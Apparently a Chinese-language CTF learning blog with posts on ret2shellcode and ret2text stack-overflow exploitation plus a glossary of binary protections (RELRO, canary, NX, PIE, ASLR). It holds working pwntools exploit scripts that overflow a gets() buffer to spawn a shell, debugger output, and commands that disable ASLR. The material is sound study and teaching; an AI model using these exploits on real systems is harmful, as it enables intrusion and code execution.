/home/kali/PWN/ret2shellcode </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8       ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────[ REGISTERS ]─────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb6808 (environ) —▸ 0xffffd39c —▸ 0xffffd531 ◂— 'SHELL=/bin/bash'</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x4e9a5ff3</span><br><span class="line"> EDX  0xffffd324 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line"> ESI  0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line"> EBP  0xffffd2f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd270 —▸ 0xf7f5bc92 ◂— pop    edi /* '__vdso_clock_gettime' */</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">──────────────────────────────────────[ DISASM ]──────────────────────────────────────</span><br><span class="line"> ► 0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [0x804a060]</span><br><span class="line">    ↓</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048553 &lt;main+38&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt &lt;0x8048410&gt;</span><br><span class="line"> </span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0] &lt;0x804a040&gt;</span><br><span class="line">   0x8048560 &lt;main+51&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048568 &lt;main+59&gt;    mov    dword ptr [esp + 8], 1</span><br><span class="line">   0x8048570 &lt;main+67&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048578 &lt;main+75&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x804857b &lt;main+78&gt;    call   setvbuf@plt &lt;0x8048410&gt;</span><br><span class="line">──────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd270 —▸ 0xf7f5bc92 ◂— pop    edi /* '__vdso_clock_gettime' */</span><br><span class="line">01:0004│      0xffffd274 —▸ 0xf7ffdc40 —▸ 0xf7fd3000 ◂— jg     0xf7fd3047</span><br><span class="line">02:0008│      0xffffd278 —▸ 0xffffd298 —▸ 0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line">03:000c│      0xffffd27c —▸ 0xf7ffde14 —▸ 0xf7ffdda0 —▸ 0xf7ffdc54 —▸ 0xf7ffdc40 ◂— ...</span><br><span class="line">04:0010│      0xffffd280 —▸ 0xffffd2d0 ◂— 0x1</span><br><span class="line">05:0014│      0xffffd284 ◂— 0x0</span><br><span class="line">06:0018│      0xffffd288 —▸ 0xf7ffd000 ◂— and    al, 0x8f /* 0x28f24 */</span><br><span class="line">07:001c│      0xffffd28c ◂— 0x0</span><br><span class="line">────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► f 0  8048536 main+9</span><br><span class="line">   f 1 f7df2ef1 __libc_start_main+241</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/kali/PWN/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/kali/PWN/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/kali/PWN/ret2shellcode</span><br><span class="line">0xf7dd4000 0xf7fb2000 r-xp   1de000 0      /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb2000 0xf7fb4000 r-xp     2000 1dd000 /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb4000 0xf7fb6000 rwxp     2000 1df000 /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 rwxp     2000 0      </span><br><span class="line">0xf7fce000 0xf7fd0000 rwxp     2000 0      </span><br><span class="line">0xf7fd0000 0xf7fd3000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd3000 0xf7fd4000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd4000 0xf7ffc000 r-xp    28000 0      /usr/lib32/ld-2.30.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 27000  /usr/lib32/ld-2.30.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 28000  /usr/lib32/ld-2.30.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure>

<p>在main函数处下断点，通过vmmap<code>#查看进程中的权限</code>。</p>
<p>buf2地址为0x0804A080，落在</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/kali/PWN/ret2shellcode</span><br></pre></td></tr></table></figure>

<p>中，所以可以看到bss段具有可执行的权限</p>
<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。需要额外注意的是最后payload的组成应该是<code>payload = shellcode + 垃圾填充字符 + 要跳转地址（这里是bss段shellcode的地址）</code>。这里的buf2地址为0x0804A080，所以的返回地址（retaddr）就是是0x0804A080。</p>
<p>编写相应的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>代码中<code>asm(shellcraft.sh())</code>是生成一个shellcode，<code>shellcode.ljust(112, b&#39;A&#39;)</code>是若生成的shellcode长度若不够112个，则用垃圾字符填充。</p>
<p>执行代码成功获取shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ python3 ret2shellcode.py </span><br><span class="line">[+] Starting local process './ret2shellcode': pid 1901</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">No system for you this time !!!</span><br><span class="line">bye bye ~$ ls</span><br><span class="line">pwndbg    ret2shellcode  ret2shellcode.py  ret2text  ret2text.py</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/31/%E4%BB%8Eret2text%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/31/%E4%BB%8Eret2text%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2text入坑栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-31 10:10:06" itemprop="dateCreated datePublished" datetime="2020-05-31T10:10:06+08:00">2020-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-05 20:20:36" itemprop="dateModified" datetime="2020-07-05T20:20:36+08:00">2020-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ret2text入坑学习，这里使用看雪题库的一道PWN题进行学习记录：<a href="https://ctf.pediy.com/itembank.htm" target="_blank" rel="noopener">一鸣惊人</a></p>
<h4 id="ret2text原理"><a href="#ret2text原理" class="headerlink" title="ret2text原理"></a>ret2text原理</h4><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h4 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h4><p>先讲一下栈的基本概念，简单说栈就是用于保存函数调用信息和局部变量的一段内存空间。</p>
<p>这里再引入函数调用栈的内容，先来看一张图。</p>
<img src="/images/从ret2text入坑栈溢出/函数调用栈.jpg" alt="函数调用栈" style="zoom:60%;" />

<p>从图中可以看到我们进入到函数后的可以控制的变量所在位置是在“当前栈帧”的“局部变量中”，当我们需要造成栈溢出执行ret2text的时候需要将“返回地址”进行覆盖，所以我们要做的是填满局部变量+覆盖保存的ebp（saved ebp）+覆盖返回地址（retaddr）为我们想要执行的地址。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>看一下看雪的一道PWN题来具体分析，题目在<a href="https://ctf.pediy.com/itembank.htm" target="_blank" rel="noopener">一鸣惊人</a>，可自行查看详情。</p>
<p>首先使用<a href="https://github.com/slimm609/checksec.sh">checksec.sh</a>查看一下程序的保护机制，pwntools的checksec和checksec.sh有些许不同，不用过多在意。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ymjr</span><br><span class="line">[*] '/home/kali/PWN/ymjr'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>



<p>可以看出程序是32位程序，仅开启了栈不可执行保护，然后通过IDA来看出源代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看主函数存在gets函数，明显可以看到存在栈溢出漏洞。</p>
<p>在secure函数里发现存在调用<code>system(&quot;/bin/sh&quot;)</code>的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看system函数的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>



<p>那么要PWN这个程序的思路就是通过gets函数输入s的值去覆盖retaddres以执行<code>system(&quot;/bin/sh&quot;)</code>代码获取shell，即返回地址要覆盖为0x0804863A。</p>
<p>s存在的是我们输入的数据，要在这里溢出，就需要确定填充长度，主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。</p>
<p>查看IDA的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br></pre></td></tr></table></figure>

<p>s变量在内存中的位置距离栈顶+1Ch个字节，距离栈底-64h个字节。这里不能使用<code>[ebp-64h]</code>来进行偏移的计算，因为查看汇编代码可知s是相对于esp的索引，所以s变量的偏移量相对于esp是正确的，而相对于ebp的偏移量是错误的，这就需要通过动态调试来获取偏移量。</p>
<p>补充：esp是栈指针，一般情况下会使用ebp来存取栈。但是在许多时候，编译器会按优化方式来编译程序，栈寻址稍有不同。这是，编译器为了节省ebp寄存器或尽可能减少代码以提高速度，会直接通过esp对参数进行寻址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>

<p>通过gdb进行调试，在call的位置下断点。这里在介绍下常用的几种下断点的方式</p>
<ul>
<li>数据断点：根据地址来设置断点，只能是在debug程序运行之后设置，如<code>b *0x400522</code>而获取地址值的方法是，先设置普通断点，在断点处<code>print &amp;变量名</code> 就能获取该变量的地址，如<code>b &amp;变量名</code>。</li>
<li>函数断点：当程序执行到某个程序时就会触发断点，如<code>b &amp;变量名</code>。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24      gets(buf);</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line"><span class="meta">$</span><span class="bash">eax   : 0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebx   : 0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ecx   : 0xffffffff</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edx   : 0xf7faf870  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebp   : 0xffffcdc8  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esi   : 0xf7fae000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edi   : 0xf7fae000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到esp为0xffffcd40，ebp为0xffffcdc8，已知s相对于esp的索引为<code>[esp+1Ch]</code>，那么s的地址为<code>[esp+1Ch]=0xffffcd5c</code>。所以s相对于ebp的偏移量为<code>[s-ebp]=0x6c</code>，因为还有saved ebp的存在，所以s相对于返回（ret）地址的偏移为<code>[0x6c+4]=0x70</code>，+4是因为一个单位栈空间占据4字节。</p>
<p>使用pwntools库编写exp程序，使用python3时，在payload一行注意填充字符时使用<code>b&#39;&#39;</code>填入bytes数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ymjr'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">112</span> + p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>代码中<code>process(&#39;./ymjr&#39;)</code>是设置需要PWN的对象程序，<code>sh.sendline(payload)</code>发送对应的payload，<code>sh.interactive()</code>是获取交互shell。</p>
<p>执行exp程序可成功获取shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ python3 ret2text.py </span><br><span class="line">[+] Starting local process './ymjr': pid 8477</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line">Maybe I will tell you next time !$ ls</span><br><span class="line">core  pwndbg  ret2text.py  ymjr</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/30/PWN%E5%B8%B8%E8%A7%81%E6%9C%AF%E8%AF%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/30/PWN%E5%B8%B8%E8%A7%81%E6%9C%AF%E8%AF%AD/" class="post-title-link" itemprop="url">PWN常见术语</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-30 20:44:47" itemprop="dateCreated datePublished" datetime="2020-05-30T20:44:47+08:00">2020-05-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-05-31 09:28:29" itemprop="dateModified" datetime="2020-05-31T09:28:29+08:00">2020-05-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始入坑PWN的学习，本文记录PWN中常见术语，见到一个学习记录一个，保持长期更新。</p>
<h4 id="GOT和PLT"><a href="#GOT和PLT" class="headerlink" title="GOT和PLT"></a>GOT和PLT</h4><ul>
<li><p>PLT : 程序链接表（PLT，Procedure Link Table）</p>
</li>
<li><p>GOT : 重局偏移表（GOT, Global Offset Table）</p>
</li>
</ul>
<p>这缘起于动态链接，动态链接需要考虑的各种因素：</p>
<ul>
<li><p>需要存放外部函数的数据段 —— PLT</p>
</li>
<li><p>获取数据段存放函数地址的一小段额外代码 —— GOT</p>
</li>
</ul>
<p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
<p>存放函数地址的数据表，称为全局偏移表（GOT, Global Offset Table），而那个额外代码段表，称为程序链接表（PLT，Procedure Link Table）。</p>
<h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>Relocation Read-Only（RELRO）此项技术主要针对GOT改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。</p>
<p>Partial RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh\x00获得shell</strong><br>Full RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>

<h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o hello test.c   //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o hello test.c    //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o hello test.c  //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o  hello test.c // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o  hello test.c // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o  hello test.c // 开启NX保护</span><br></pre></td></tr></table></figure>

<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>Return Oriented Programming，面向return的编程，核心是系统调用，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
<p>ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<h4 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h4><p>以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写<br> GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。<br> 若开启一般需在攻击时泄露地址信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello test.c  // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o hello test.c  // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o hello test.c  // 开启PIE，此时为最高强度2</span><br><span class="line">(还与运行时系统ALSR设置有关）</span><br></pre></td></tr></table></figure>

<h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p>
<p>ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。</p>
<p>ASLR 的等级可以通过一个内核参数 <strong>randomize_va_space</strong> 来进行控制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space  // 查看ASLR等级</span><br><span class="line">sudo bash -c <span class="string">"echo 0 &gt; /proc/sys/kernel/randomize_va_space"</span>  // 关闭ASLR</span><br><span class="line">sudo bash -c <span class="string">"echo 1 &gt; /proc/sys/kernel/randomize_va_space"</span>  // 普通的ASLR</span><br><span class="line">sudo bash -c <span class="string">"echo 2 &gt; /proc/sys/kernel/randomize_va_space"</span>  // 增强的ASLR</span><br></pre></td></tr></table></figure>

<h4 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h4><p>程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。</p>
<h4 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h4><p>这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。<br>加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk,__printf_chk等。<br>这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，<br>避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。<br>开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在<br>这种检查是默认不开启的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -D_FORTIFY_SOURCE=2 -O1  // 开启fortity检查，开启后会替换strcpy等危险函数。</span><br></pre></td></tr></table></figure>

